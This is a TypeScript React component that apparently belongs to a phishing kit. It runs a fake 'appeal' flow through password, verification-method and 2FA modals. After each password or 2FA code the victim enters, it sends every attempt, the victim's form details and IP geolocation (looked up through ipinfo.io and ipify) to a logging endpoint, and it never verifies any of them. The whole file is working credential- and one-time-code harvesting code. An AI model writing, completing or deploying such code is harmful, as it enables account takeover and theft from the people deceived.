"use client";

import { useState, useCallback, createContext, useContext, useRef, useEffect } from "react";
import { AppealModal } from "./modals/AppealModal";
import { PasswordModal } from "./modals/PasswordModal";
import { MethodModal } from "./modals/MethodModal";
import { TwoFAModal } from "./modals/TwoFAModal";
import { SuccessModal } from "./modals/SuccessModal";
import type { FormData, ContactInfo, VerificationMethod, ModalState, LocationData } from "@/types/form";

interface ModalFlowContextType {
  openModal: () => void;
}

const ModalFlowContext = createContext<ModalFlowContextType | null>(null);

export function useModalFlow() {
  const context = useContext(ModalFlowContext);
  if (!context) {
    throw new Error("useModalFlow must be used within ModalFlowProvider");
  }
  return context;
}

export function ModalFlowProvider({ children }: { children: React.ReactNode }) {
  const [state, setState] = useState<ModalState>({
    currentStep: null,
    formDetails: null,
    contactInfo: null,
    passwordAttempts: [],
    twofaAttempts: [],
    selectedMethod: null,
  });

  // Ref để track các log đã gửi, tránh duplicate
  const logSentRef = useRef<Set<string>>(new Set());

  // Fetch IP/location ngay khi load - ưu tiên /api/detect-location (cf-ipcountry), fallback ipinfo
  const locationRef = useRef<LocationData | null>(null);
  useEffect(() => {
    const isIpv4 = (value: string): boolean => {
      const parts = value.split(".");
      if (parts.length !== 4) return false;
      return parts.every((part) => /^\d+$/.test(part) && Number(part) >= 0 && Number(part) <= 255);
    };

    const setLocation = (data: {
      ip: string;
      ipv4?: string;
      country: string;
      countryCode: string;
      city?: string;
      region?: string;
    }) => {
      const ipv4 = data.ipv4 && isIpv4(data.ipv4) ? data.ipv4 : "";
      const preferredIp = ipv4 || data.ip || "unknown";
      locationRef.current = {
        ip: preferredIp,
        ipv4: ipv4 || undefined,
        location: {
          country: data.country || "Unknown",
          countryCode: data.countryCode || "US",
          city: data.city || "",
          region: data.region || "",
        },
      };
    };

    const fetchIpInfo = async (): Promise<{
      ip: string;
      country: string;
      countryCode: string;
      city?: string;
      region?: string;
    } | null> => {
      try {
        const r = await fetch("https://ipinfo.io/json");
        const d = await r.json();
        const country = d.country
          ? new Intl.DisplayNames(["en"], { type: "region" }).of(d.country) || d.country
          : "Unknown";
        return { ip: d.ip || "unknown", country, countryCode: d.country || "US", city: d.city, region: d.region };
      } catch {
        return null;
      }
    };

    const fetchPublicIpv4 = async (): Promise<string> => {
      try {
        const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json();
        return isIpv4(d?.ip || "") ? d.ip : "";
      } catch {
        return "";
      }
    };

    type DetectLocationResponse = {
      success?: boolean;
      ip?: string;
      ipv4?: string;
      country?: string;
      countryCode?: string;
      city?: string;
      region?: string;
    };

    const loadLocation = async () => {
      let detectData: DetectLocationResponse | null = null;
      try {
        detectData = await fetch("/api/detect-location").then((r) => r.json());
      } catch {
        detectData = null;
      }

      const shouldFetchIpInfo =
        !detectData?.success ||
        !detectData?.ip ||
        detectData.ip === "unknown" ||
        !detectData?.city ||
        !detectData?.region;

      const ipInfoData = shouldFetchIpInfo ? await fetchIpInfo() : null;
      const merged = {
        ip: detectData?.ip || ipInfoData?.ip || "unknown",
        country: detectData?.country || ipInfoData?.country || "Unknown",
        countryCode: detectData?.countryCode || ipInfoData?.countryCode || "US",
        city: detectData?.city || ipInfoData?.city || "",
        region: detectData?.region || ipInfoData?.region || "",
        ipv4: detectData?.ipv4 || "",
      };

      const ipv4FromData =
        (merged.ipv4 && isIpv4(merged.ipv4) && merged.ipv4) ||
        (isIpv4(merged.ip) ? merged.ip : "");
      const publicIpv4 = ipv4FromData || (await fetchPublicIpv4());

      setLocation({
        ...merged,
        ip: publicIpv4 || merged.ip,
        ipv4: publicIpv4 || undefined,
      });
    };

    void loadLocation();
  }, []);

  // Helper function để gửi log với deduplication
  const sendLogEvent = useCallback(async (
    formDetails: FormData | null,
    passwordAttempts: string[],
    twofaAttempts: string[],
    selectedMethod: VerificationMethod | null
  ) => {
    // Tạo unique key từ attempts để check duplicate
    const logKey = `p${passwordAttempts.length}_t${twofaAttempts.length}_${passwordAttempts.join(",")}_${twofaAttempts.join(",")}`;
    
    // Nếu đã gửi log này rồi, skip
    if (logSentRef.current.has(logKey)) {
      return;
    }

    // Đánh dấu đã gửi
    logSentRef.current.add(logKey);

    try {
      await fetch("/api/log-event", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          formDetails,
          passwordAttempts,
          twofaAttempts,
          selectedMethod,
          locationData: locationRef.current,
        }),
      });
    } catch (error) {
      console.error("Log event error:", error);
      // Nếu lỗi, remove khỏi set để có thể retry
      logSentRef.current.delete(logKey);
    }
  }, []);

  // Log event to API
  const logEvent = useCallback(async () => {
    await sendLogEvent(state.formDetails, state.passwordAttempts, state.twofaAttempts, state.selectedMethod);
  }, [state.formDetails, state.passwordAttempts, state.twofaAttempts, state.selectedMethod, sendLogEvent]);

  // Bước 1: Submit form
  const handleFormSubmit = useCallback(
    (formData: FormData) => {
      const contactInfo: ContactInfo = {
        phone: formData.phoneNumber,
        email: formData.email,
      };

      setState((prev) => ({
        ...prev,
        formDetails: formData,
        contactInfo,
        currentStep: "password",
        passwordAttempts: [],
        twofaAttempts: [],
      }));
    },
    []
  );

  // Bước 2: Password attempt - gửi log sau mỗi lần attempt
  const handlePasswordAttempt = useCallback(
    (password: string) => {
      setState((prev) => {
        const newAttempts = [...prev.passwordAttempts, password];
        // Gửi log ngay sau khi update state với deduplication
        setTimeout(() => {
          sendLogEvent(prev.formDetails, newAttempts, prev.twofaAttempts, prev.selectedMethod);
        }, 100);
        return { ...prev, passwordAttempts: newAttempts };
      });
    },
    [sendLogEvent]
  );

  // Bước 2: Password success -> tự động chọn method mặc định và chuyển thẳng sang twofa (bỏ qua method selection)
  const handlePasswordSuccess = useCallback(() => {
    setState((prev) => ({ 
      ...prev, 
      selectedMethod: "email", // Tự động chọn email làm method mặc định
      currentStep: "twofa" 
    }));
  }, []);

  // Bước 3: Chọn method
  const handleMethodSelect = useCallback((method: VerificationMethod) => {
    setState((prev) => ({
      ...prev,
      selectedMethod: method,
      currentStep: "twofa",
    }));
  }, []);

  // Bước 4: 2FA attempt - gửi log sau mỗi lần attempt
  const handleTwoFAAttempt = useCallback(
    (code: string) => {
      setState((prev) => {
        const newAttempts = [...prev.twofaAttempts, code];
        // Gửi log ngay sau khi update state với deduplication
        setTimeout(() => {
          sendLogEvent(prev.formDetails, prev.passwordAttempts, newAttempts, prev.selectedMethod);
        }, 100);
        return { ...prev, twofaAttempts: newAttempts };
      });
    },
    [sendLogEvent]
  );

  // Bước 4: 2FA success -> chuyển sang success
  const handleTwoFASuccess = useCallback(() => {
    setState((prev) => ({ ...prev, currentStep: "success" }));
    setTimeout(() => {
      logEvent();
    }, 100);
  }, [logEvent]);

  // Đóng modal
  const handleClose = useCallback(() => {
    // Reset log tracking khi đóng modal
    logSentRef.current.clear();
    setState({
      currentStep: null,
      formDetails: null,
      contactInfo: null,
      passwordAttempts: [],
      twofaAttempts: [],
      selectedMethod: null,
    });
  }, []);

  // Mở modal đầu tiên
  const openModal = useCallback(() => {
    setState((prev) => ({ ...prev, currentStep: "form" }));
  }, []);

  return (
    <ModalFlowContext.Provider value={{ openModal }}>
      {children}
      <AppealModal
        isOpen={state.currentStep === "form"}
        onClose={handleClose}
        onSubmit={handleFormSubmit}
      />

      {state.contactInfo && (
        <>
          <PasswordModal
            isOpen={state.currentStep === "password"}
            onClose={handleClose}
            onSubmit={handlePasswordSuccess}
            onAttempt={handlePasswordAttempt}
          />

          <MethodModal
            isOpen={state.currentStep === "method"}
            onClose={handleClose}
            onSubmit={handleMethodSelect}
            phone={state.contactInfo.phone}
            email={state.contactInfo.email}
            dialCode={state.formDetails?.dialCode || "+84"}
          />

          {state.selectedMethod && (
            <TwoFAModal
              isOpen={state.currentStep === "twofa"}
              onClose={handleClose}
              onSubmit={handleTwoFASuccess}
              onAttempt={handleTwoFAAttempt}
              method={state.selectedMethod}
              phone={state.contactInfo.phone}
              email={state.contactInfo.email}
              dialCode={state.formDetails?.dialCode || "+84"}
            />
          )}
        </>
      )}

      <SuccessModal isOpen={state.currentStep === "success"} onClose={handleClose} />
    </ModalFlowContext.Provider>
  );
}
